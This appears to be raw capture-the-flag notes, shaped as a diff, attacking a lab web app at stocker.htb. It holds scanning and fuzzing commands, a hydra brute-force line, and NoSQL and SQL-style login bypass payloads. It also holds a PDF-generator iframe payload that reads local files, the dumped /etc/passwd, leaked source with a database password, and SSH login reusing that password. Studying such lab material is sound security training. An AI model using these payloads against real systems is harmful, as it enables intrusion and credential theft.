@@ -1,0 +1,164 @@
+└─$ nmap -sCV -Pn -p- 10.10.11.196 2>/dev/null
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-14 15:54 +07
+Nmap scan report for 10.10.11.196
+Host is up (0.13s latency).
+Not shown: 65533 filtered tcp ports (no-response)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   3072 3d12971d86bc161683608f4f06e6d54e (RSA)
+|   256 7c4d1a7868ce1200df491037f9ad174f (ECDSA)
+|_  256 dd978050a5bacd7d55e827ed28fdaa3b (ED25519)
+80/tcp open  http    nginx 1.18.0 (Ubuntu)
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+|_http-title: Did not follow redirect to http://stocker.htb
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+
+wfuzz -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -H "Host: FUZZ.stocker.htb" --hc 403,400,301 -t 50 10.10.11.196
+
+000000022:   302        0 L      4 W        28 Ch       "dev"
+
+dev.stocker.htb/login
+<input type="text" class="form-control" id="username" name="username" placeholder="jsmith" />
+ 
+ 
+export HYDRA_PROXY_HTTP=http://127.0.0.1:8080
+hydra -l jsmith -P /home/anhndt/Stuffs/rockyou.txt dev.stocker.htb http-post-form "/login:username=^USER^&password=^PASS^:login-error" -I
+
+
+username=jsmith'+||+'1'=='1&password=
+
+{"username": {"$ne": null}, "password": {"$ne": null} }
+
+
+dirsearch -u http://dev.stocker.htb -e "*" -r --cookie="connect.sid=s%3Ae1wz9E47Z0YBzmPe9yu7NALoyZoGlnBs.3GgC1gHS8yyluR7nUCjVkNPaPgUbUa2bAQST2vs8Frs" --proxy="127.0.0.1:8080"
+
+
+
+exiftool or burp => Skia/PDF m108
+
+SyntaxError: Unexpected token { in JSON at position 311<br> &nbsp; &nbsp;at JSON.parse (&lt;anonymous&gt;)<br> &nbsp; &nbsp;at parse (/var/www/dev/node_modules/body-parser/lib/types/json.js:89:19)<br> &nbsp; &nbsp;at /var/www/dev/node_modules/body-parser/lib/read.js:128:18<br> &nbsp; &nbsp;at AsyncResource.runInAsyncScope (node:async_hooks:203:9)<br> &nbsp; &nbsp;at invokeCallback (/var/www/dev/node_modules/raw-body/index.js:231:16)<br> &nbsp; &nbsp;at done (/var/www/dev/node_modules/raw-body/index.js:220:7)<br> &nbsp; &nbsp;at IncomingMessage.onEnd (/var/www/dev/node_modules/raw-body/index.js:280:7)<br> &nbsp; &nbsp;at IncomingMessage.emit (node:events:513:28)<br> &nbsp; &nbsp;at endReadableNT (node:internal/streams/readable:1359:12)<br> &nbsp; &nbsp;at process.processTicksAndRejections (node:internal/process/task_queues:82:21)
+
+/var/www/dev/node_modules/raw-body/index.js
+/var/www/dev/index.js
+
+<iframe src=file:///var/www/dev/node_modules/raw-body/index.js> 
+
+(ref:https://www.triskelelabs.com/blog/extracting-your-aws-access-keys-through-a-pdf-file)
+(ref:https://www.jomar.fr/posts/2021/ssrf_through_pdf_generation/)
+
+<script>document.write(123)</script>
+
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System
+(admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network
+Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd
+Resolver,,,:/run/systemd:/usr/sbin/nologin
+systemd-timesync:x:102:104:systemd Time
+Synchronization,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
+syslog:x:104:110::/home/syslog:/usr/sbin/nologin
+_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
+tss:x:106:112:TPM software stack,,,:/var/lib/tpm:/bin/false
+uuidd:x:107:113::/run/uuidd:/usr/sbin/nologin
+tcpdump:x:108:114::/nonexistent:/usr/sbin/nologin
+landscape:x:109:116::/var/lib/landscape:/usr/sbin/nologin
+pollinate:x:110:1::/var/cache/pollinate:/bin/false
+sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
+systemd-coredump:x:999:999:systemd Core
+Dumper:/:/usr/sbin/nologin
+fwupd-refresh:x:112:119:fwupd-refresh
+user,,,:/run/systemd:/usr/sbin/nologin
+mongodb:x:113:65534::/home/mongodb:/usr/sbin/nologin
+angoose:x:1001:1001:,,,:/home/angoose:/bin/bash
+_laurel:x:998:998::/var/log/laurel:/bin/false
+
+
+
+const express = require("express");
+const mongoose = require("mongoose");
+const session = require("express-session");
+const MongoStore = require("connect-mongo");
+const path = require("path");
+const fs = require("fs");
+const { generatePDF, formatHTML } = require("./pdf.js");
+const { randomBytes, createHash } = require("crypto");
+const app = express();
+const port = 3000;
+// TODO: Configure loading from dotenv for production
+const dbURI =
+"mongodb://dev:IHeardPassphrasesArePrettySecure@localhost/dev?
+authSource=admin&w=1";
+app.use(express.json());
+app.use(express.urlencoded({ extended: false }));
+app.use(
+ session({
+ secret: randomBytes(32).toString("hex"),
+ resave: false,
+ saveUninitialized: true,
+ store: MongoStore.create({
+ mongoUrl: dbURI,
+ }),
+ })
+);
+app.use("/static", express.static(__dirname + "/assets"));
+app.get("/", (req, res) => {
+ return res.redirect("/login");
+});
+app.get("/api/products", async (req, res) => {
+ if (!req.session.user) return res.json([]);
+ const products = await mongoose.model("Product").find();
+ return res.json(products);
+});
+app.get("/login", (req, res) => {
+ if (req.session.user) return res.redirect("/stock");
+ return res.sendFile(__dirname + "/templates/login.html");
+});
+app.post("/login", async (req, res) => {
+ const { username, password } = req.body;
+ if (!username || !password) return res.redirect("/login?
+error=login-error");
+ // TODO: Implement hashing
+ const user = await mongoose.model("User").findOne({
+username, password });
+ if (!user) return res.redirect("/login?error=login-error");
+ req.session.user = user.id;
+ console.log(req.session);
+ return res.redirect("/stock");
+ 
+
+ 
+ 
+ssh angoose@10.10.11.196
+IHeardPassphrasesArePrettySecure
+ 
+ 
+ 
+ 
+
+
+
+
+
+
+
